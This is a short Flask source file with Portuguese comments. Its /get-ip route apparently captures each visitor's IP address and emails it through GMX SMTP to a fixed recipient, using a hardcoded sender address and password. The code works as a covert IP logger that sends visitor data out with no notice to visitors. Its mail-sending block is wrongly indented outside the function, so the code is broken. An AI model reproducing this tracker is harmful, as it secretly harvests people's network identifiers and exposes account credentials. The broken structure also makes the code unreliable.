from flask import Flask, request
import smtplib

app = Flask(__name__)

@app.route('/get-ip', methods=['GET'])
def get_ip():
    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)

    # Configuração do servidor de email
    email_server = 'smtp.gmx.com'
    email_port = 465
    email_sender = 'florzinha2@gmx.com'
    email_password = 'prosopopei4'
    email_recipient = 'petista@gmx.com'

    # Criação da mensagem
    subject = 'Endereço IP do Usuário'
    message = f'O endereço IP do usuário é: {ip}'
    email_text = f'Subject: {subject}\n\n{message}'

    # Envio do email
try:
    with smtplib.SMTP_SSL(email_server, email_port) as server:
        server.login(email_sender, email_password)
        server.sendmail(email_sender, email_recipient, email_text)
except Exception as e:
    print(f'Erro ao enviar o email: {str(e)}')

if __name__ == '__main__':
    app.run()
